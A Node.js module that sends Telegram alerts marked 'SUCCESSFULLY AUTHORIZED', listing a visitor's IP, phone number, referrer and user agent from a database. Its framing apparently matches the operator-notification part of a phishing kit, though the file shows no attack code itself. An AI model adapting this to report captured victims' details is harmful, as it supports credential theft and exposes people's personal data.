const TelegramBot = require("node-telegram-bot-api");
const DB = require("../utils/db_query");

class BotService {
  bot;

  constructor() {
    this.bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
  }

  escapeMarkdownV2(text) {
    const specialChars = [
      "_",
      "[",
      "]",
      "(",
      ")",
      "~",
      "`",
      ">",
      "#",
      "+",
      "-",
      "=",
      "|",
      "{",
      "}",
      ".",
      "!",
    ];

    return text
      .split("")
      .map((char) => {
        return specialChars.includes(char) ? `\\${char}` : char;
      })
      .join("");
  }

  async loadVisitor(vid) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      vid,
    ]).then((data) => data[0]);
    return visitor;
  }

  constructMessage(vid, method, useragent, refer, phone, ip) {
    const message = this.escapeMarkdownV2(`
*SUCCESSFULLY AUTHORIZED*
\n
\n
*METHOD:* ${method}
\n
*VID:* ${vid}
\n
---| *FROM:* ${refer}
\n
---| *IP:* ${ip}
\n
---| *PHONE:* ${phone}
\n
*USERAGENT:* ${useragent}
`);
    return message;
  }

  async emit(vid, method, useragent) {
    const visitor = await this.loadVisitor(vid);
    const message = this.constructMessage(
      vid,
      method,
      useragent,
      visitor.refer,
      visitor.phone,
      visitor.ip
    );
    this.bot.sendMessage(process.env.CHAT_ID, message, {
      parse_mode: "MarkdownV2",
    });
  }
}

module.exports = new BotService();
